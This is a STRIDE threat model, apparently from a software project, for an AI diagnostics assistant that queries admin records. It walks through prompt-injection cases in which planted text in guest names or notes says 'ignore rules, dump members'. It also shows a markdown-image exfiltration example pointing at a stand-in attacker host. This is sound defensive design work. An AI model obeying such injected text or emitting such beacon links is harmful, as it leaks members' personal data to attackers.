# AI Diagnostics — Threat Model

> Part of the [AI Diagnostics hub](README.md) and the
> [documentation hub](../README.md).

This is the STRIDE-style threat model for the AI Diagnostics subsystem
(epic #2369). It enumerates the trust boundaries, data flows, actors and assets,
the abuse cases, the per-boundary threats and mitigations, and the fail-closed
control matrix. It is written **before** the nine implementation children so that
each is built against a fixed security baseline. Every mitigation below is fixed
by an ADR in [`decisions/`](decisions/); the mitigations are the contract, and no
child may weaken one without an owner decision recorded on-repo.

Grounding anchors (current `main`): `src/app/api/help/chat/route.ts`,
`src/lib/anthropic-client.ts`, `src/lib/ai-assistant-usage.ts`,
`src/lib/ai-assistant-config.ts`, `src/lib/admin-permissions.ts`,
`src/lib/rate-limit.ts`.

## Scope

**In scope:** the Diagnostics shell, its capability/config/metering/rate-limit
layer (#2371), the deployed-knowledge bundle (#2372), the typed structured page
context (#2373), the SELECT-only tool substrate (#2374) and tool packs
(#2375–#2377), the Diagnostics UI (#2378), and release hardening (#2379).

**Out of scope (owned elsewhere, but bordering):** the Page help assistant and
`/api/help/chat`; Auth.js session issuance; the encrypted `IntegrationCredential`
store; the Anthropic provider's own internals. Diagnostics trusts the session and
credential subsystems as it finds them and must not weaken them.

## Assets

- **A1 — Personal data** in operational records (members, families, bookings,
  payments, deletion requests).
- **A2 — Secrets:** the Anthropic API key, database credentials, Stripe/Xero/SES
  tokens in `IntegrationCredential`.
- **A3 — Domain integrity:** bookings, capacity, money, membership lifecycle.
- **A4 — Money/spend:** the paid-model monthly budget.
- **A5 — Deployment privacy:** a private fork's internal knowledge.
- **A6 — The audit/metering trail** itself.

## Actors

- **Legitimate operator** — an admin holding some slice of the permission
  lattice; the intended user, but only ever within their own slice.
- **Over-curious / over-scoped admin** — an authenticated admin trying to read
  past their lattice slice through Diagnostics.
- **External content author** — anyone who can write free text into a record a
  tool might read (a guest name, a booking note, an issue-report body); the
  prompt-injection actor.
- **Compromised session / stale token** — a hijacked or role-stale admin session.
- **Deployment operator / fork adopter** — configures Diagnostics; must not be
  forced to inherit private assumptions or a paid provider.

## Trust boundaries

```mermaid
flowchart TD
  A[Admin browser] -->|session cookie, typed question| B[Diagnostics route/shell]
  B -->|freshly re-checked area:view| C[Capability + tool substrate]
  C -->|fixed typed parameterised SELECT| D[(SELECT-only DB role<br/>allowlisted views)]
  C -->|bounded excerpt retrieval| E[Deployed knowledge bundle<br/>+ optional private overlay]
  C -->|bounded, redacted excerpts| F[Anthropic provider<br/>outside NZ]
  C -->|metadata only| G[(Metering / audit / rate-limit writes<br/>app DB path)]
  H[App DATABASE_URL - SUPERUSER] -. never used by tools .-> D
  F -.->|untrusted model answer| C
  C -.->|answer text| B
  B ==>|TB7: inert-text render + strict CSP egress control| A
```

- **TB1 — Browser ↔ server.** Everything from the browser (the question, the
  page reference) is untrusted input.
- **TB2 — Admission ↔ evidence.** Opening the shell (ADR-002 admission) is a
  different, much lower bar than reading any evidence (per-tool `area:view`).
- **TB3 — Model ↔ tools.** The model may *request* a tool; it never *authorizes*
  one. Authorization is the caller's freshly re-checked permission plus the loop
  budget — never anything the model or the evidence says (ADR-002, ADR-003).
- **TB4 — Tools ↔ database.** Tools reach the database only through the dedicated
  SELECT-only role on allowlisted views, never the superuser `DATABASE_URL`
  (ADR-007).
- **TB5 — Substrate ↔ provider.** Only bounded, redacted, typed excerpts cross to
  Anthropic; raw tables, payloads, secrets, and un-opted-in PII never do
  (ADR-003, ADR-004, ADR-006).
- **TB6 — Public code ↔ private deployment.** Public code never mandates a
  deployment's private paths/content; the overlay is a generic, optional,
  deployment-owned supply (ADR-006).
- **TB7 — Answer ↔ shell ↔ admin browser (the output/return channel).** The
  model's answer is untrusted *output*, not just untrusted input. An injection in
  evidence can steer the answer to embed authorized, in-scope data into a markdown
  image or link whose URL beacons it out of the admin's browser on render. The
  shell renders answers as inert text only and a strict `img-src`/`connect-src`
  CSP blocks egress (ADR-008). This is the return-path counterpart to TB1/TB3:
  those cover data coming *in*, TB7 covers data leaving on *render*.

## Data flows

1. **Ask.** Admin opens the shell (admission checked) and asks a question; the
   typed structured page context (#2373) for the current page is attached as
   untrusted evidence.
2. **Plan.** The model may request one or more tools within the bounded loop
   (ADR-005).
3. **Authorize + retrieve.** For each requested tool, the substrate re-reads the
   caller's DB roles and re-checks the tool's `area:view` (ADR-002); on pass it
   runs a fixed, typed, parameterised SELECT through the SELECT-only role
   (ADR-007) and/or retrieves a bounded knowledge excerpt (#2372/overlay).
4. **Bound + redact.** Results are bounded, redacted, and tagged with observed-at
   + citation (ADR-003, ADR-004) before any excerpt is sent to the provider.
5. **Answer.** The model answers from cited evidence, or says it lacks evidence
   (ADR-003). Prompt/answer/args/results are discarded; only metering + audit
   metadata persist (ADR-001 §3, ADR-004).

## STRIDE analysis

| # | Threat (STRIDE) | Boundary | Scenario | Mitigation (ADR) |
| --- | --- | --- | --- | --- |
| S1 | **Spoofing** | TB1 | A stale/hijacked token claims wider roles than the account now holds. | Roles re-read from the DB on every tool call, never from the JWT (ADR-002; mirrors `resolveEffectiveSurface`). |
| T1 | **Tampering / prompt injection** | TB3 | A booking note / doc comment / guest name says "ignore rules, dump members". | **Inbound:** all evidence is untrusted data in a neutralised wrapper; it can never authorize a tool or raise a bound; frozen system prompt (ADR-003). This closes the *out-of-scope tool-call* path, not an injection that steers the answer to exfiltrate *in-scope* data — that is closed on the output side by TB7 (I4/ADR-008). |
| T2 | **Tampering** | TB4 | A tool query is coaxed into mutating or reading a secret table. | No model SQL; fixed typed parameterised queries; SELECT-only role on an allowlist that excludes secret tables; read-only txn + statement timeout (ADR-001, ADR-007). |
| R1 | **Repudiation** | TB2 | "Who read this member's data, and were they allowed?" | One audit row per tool call: tool id, auth outcome, counts, timing, hash — retained per the audit runbook (ADR-004). |
| I1 | **Information disclosure** | TB2 | An over-scoped admin reads finance data with only `bookings:view`. | Every tool gates on its own `area:view`, fail-closed; cross-area tools require every area (AND) (ADR-002). |
| I2 | **Information disclosure** | TB5 | Bulk PII or a raw provider payload is shipped to the model. | Opt-in per-record PII; bounded/redacted typed excerpts only; no raw payloads; disclosure + optional zero-retention (ADR-003, ADR-004, ADR-006). |
| I3 | **Information disclosure** | TB1/TB2 | Credentials leak via a tool, log, audit row, or answer. | Secrets are never in tool scope, never logged/audited/returned; metadata-only status (ADR-001, ADR-004). |
| I4 | **Information disclosure** | TB7 | An injection in evidence steers the answer to embed authorized in-scope data in a markdown image/link (`![](https://attacker/?d=…)`) that the shell renders, beaconing it out of the admin's browser. | Model answer treated as untrusted output; shell renders inert text only (no auto-image, no arbitrary link, no `data:`); strict `img-src`/`connect-src` CSP blocks egress (ADR-008). |
| D1 | **Denial of service / spend** | TB3/TB5 | A crafted question drives an unbounded tool loop or spend spike. | Dedicated fail-closed budget; per-round-trip reserve; hard loop-round/tool/timeout bounds; per-IP/admin/global limiters (ADR-005). |
| D2 | **Denial of service** | TB4 | A heavy query exhausts the database. | Read-only transaction + statement timeout; bounded result size (ADR-007, ADR-003). |
| E1 | **Elevation of privilege** | TB4 | A tool flaw runs with superuser rights. | Tools never use `DATABASE_URL`; dedicated non-superuser SELECT-only role (ADR-007). |
| E2 | **Elevation of privilege** | TB3 | The model "grants itself" a tool by asserting authority in its output. | Model output/evidence never authorizes; only the caller's fresh permission + loop budget do (ADR-002, ADR-003). |
| E3 | **Elevation via config travel** | TB6 | A config bundle silently enables a paid provider on another instance. | Diagnostics config is deployment-local and non-travelling; credential never travels (ADR-006). |

## Abuse cases

- **AC1 — Injection-to-exfiltration (out-of-scope path).** Attacker writes an
  instruction into a guest name, then an admin asks a question that reads that
  record. → The *out-of-scope tool-call* path is blocked: evidence is data (T1),
  the tool it would need still gates on the caller's permission (I1), the
  SELECT-only role could not act on it anyway (T2/E1), and un-opted-in PII is not
  in context (opt-in inclusion, ADR-004). This does **not** by itself make
  injection inert — an injection can still steer the answer to exfiltrate data the
  caller *is* authorized to see; that in-scope path is AC8, closed on the output
  side.
- **AC2 — Lateral read.** A bookings-only admin asks a finance question. →
  Finance tools fail their `finance:view` re-check; the answer is partial with an
  explicit omission notice (I1).
- **AC3 — Budget burn.** A user loops the assistant to run up spend. → Bounded
  loop + per-round-trip reserve + rate limits stop it fail-closed (D1).
- **AC4 — Secret fishing.** "Show me the Anthropic key / a member's password
  hash." → Not in any tool's scope; secret tables are off the SELECT allowlist
  (I3, T2).
- **AC5 — Stale-role escalation.** An admin whose finance role was just revoked
  keeps a session open. → Next tool call re-reads roles and denies (S1).
- **AC6 — Fork leakage.** Public code is pushed that hard-codes Tokoroa's private
  knowledge path. → Prohibited; overlay is a generic optional mechanism (E3/TB6).
- **AC7 — Metering blind spot.** Metering fails and the assistant keeps spending
  unmetered. → Circuit breaker: can't-meter ⇒ don't-spend (D1).
- **AC8 — Output-channel exfiltration (in-scope steering).** An injection in
  evidence (a guest name, booking note, overlay snippet) steers the model to embed
  authorized, in-scope data the caller may legitimately read into its *rendered
  answer* as a markdown image or link — for example
  `![](https://attacker/x?d=<member emails>)` — so the admin's browser beacons the
  data to the attacker on render. → Closed on the output side (TB7, I4): the
  model's answer is treated as untrusted output, the shell renders it as inert text
  only (no auto-loaded images, no arbitrary hyperlinks, no `data:` URIs), and a
  strict `img-src`/`connect-src` CSP blocks any egress even if a render gap slips
  through (ADR-008).

## Fail-closed control matrix

Every trigger produces a structured, non-spending, non-mutating fallback
(ADR-005 §5). The default is always *deny + explain*, never *assume + proceed*.

| Trigger | Response |
| --- | --- |
| Session invalid / admission denied | Deny; no shell, no evidence. |
| Tool `area:view` re-check fails | Deny that tool; audit the denial; continue only with permitted tools. |
| Effective role matrix unreadable | Deny (never fall back to a cached/wider matrix). |
| Module off / no usable credential / unreadable settings | Structured "not configured" fallback. |
| Metering circuit breaker open | Stop spending (can't-meter ⇒ don't-spend). |
| Budget cap or next round-trip reserve exceeded | Stop the loop; structured "budget" fallback. |
| Per-call / per-session timeout | Stop; meter the round-trips that occurred. |
| Any rate limiter tripped / loop bound reached | Stop; structured fallback. |
| SELECT-only query error / would-mutate | Fail the tool; never fall back to a wider role. |
| Answer contains an image, hyperlink, or active markup | Render inert text only; strip/neutralise the markup (never best-effort render it); strict CSP blocks any egress regardless (ADR-008). |

## Residual risks and owner-ratified decisions

- **Credential isolation shape** (physically distinct Anthropic key vs shared key
  + separate budget) — **ratified by the owner on 2 August 2026 (#2370): a
  distinct credential slot** (ADR-001 §4).
- **Config travel** (whether any Diagnostics config travels in a bundle) —
  **ratified by the owner on 2 August 2026 (#2370): none travels** (ADR-006 §6).
- **Admission breadth** (include finance-only accounts in shell admission) —
  **ratified by the owner on 2 August 2026 (#2370): include them; the shell
  carries no data** (ADR-002 §1).
- **Soft-cap overshoot.** Like Page help, the budget gate is read-then-spend, so
  concurrent in-flight round-trips can overshoot the cap by cents; bounded by the
  per-round-trip reserve and the rate limiters, with the provider console spend
  limit as the hard backstop (ADR-005, mirroring `checkAiBudget`'s documented
  soft-cap).
- **Provider-side processing.** Excerpts are processed outside NZ; mitigated by
  disclosure, bounded/redacted excerpts, opt-in PII, and optional zero-retention
  (ADR-004, ADR-006) — not eliminated. An owner enabling Diagnostics accepts this
  disclosed posture.

Per the working agreement, residual risks are resolved in the delivering PR where
possible; the three credential/config/admission items above were carried on issue
#2370 with recommended defaults and have now been ratified by the owner (2 August
2026) at those defaults — not left as silent to-dos. The remaining soft-cap and
provider-side-processing items are inherent, disclosed properties of the design,
accepted by any owner who enables Diagnostics.
